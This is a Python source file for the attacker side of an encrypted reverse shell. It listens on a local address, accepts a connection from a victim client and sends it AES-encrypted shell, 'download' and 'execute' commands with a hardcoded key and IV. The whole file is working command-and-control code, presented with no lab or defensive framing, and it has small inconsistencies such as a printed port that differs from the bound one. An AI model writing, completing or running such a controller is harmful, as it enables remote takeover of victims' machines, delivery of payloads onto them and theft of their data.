import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def do_encrypt(message):
    key = b'This is a key123'
    iv = b'This is an IV456'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # Pad the message to fit the block size
    length = 16 - (len(message) % 16)
    message += bytes([length]) * length
    ciphertext = cipher.encrypt(message)
    return ciphertext

def do_decrypt(ciphertext):
    key = b'This is a key123'
    iv = b'This is an IV456'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    message = cipher.decrypt(ciphertext)
    return message[:-message[-1]]

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("192.168.88.128", 7777))
        s.listen(1)
        print('[+] Listening for incoming TCP connection on port 5555')
        conn, addr = s.accept()
        print('[+] Connection established from: ', addr)

        while True:
            command = input("Shell> ")
            encrypted_command = do_encrypt(command.encode())
            if 'terminate' in command:
                conn.send(encrypted_command)
                conn.close()
                break
            elif 'download' in command:
                # Split the command to get the URL
                _, url = command.split(' ', 1)
                # Send the encrypted command to the client
                conn.send(encrypted_command)
                # Wait for response from client to confirm download success
                encrypted_response = conn.recv(8192)
                response = do_decrypt(encrypted_response).decode()
                print(response)
            elif 'execute' in command:
                # Send the encrypted command to the client
                conn.send(encrypted_command)
            else:
                # Send the encrypted command to the client
                conn.send(encrypted_command)
                # Receive and decrypt the response from the client
                encrypted_response = conn.recv(8192)
                response = do_decrypt(encrypted_response).decode()
                print(response)
    except Exception as e:
        print("Error:", e)
        if conn:
            conn.close()

def main():
    connect()

if __name__ == "__main__":
    main()

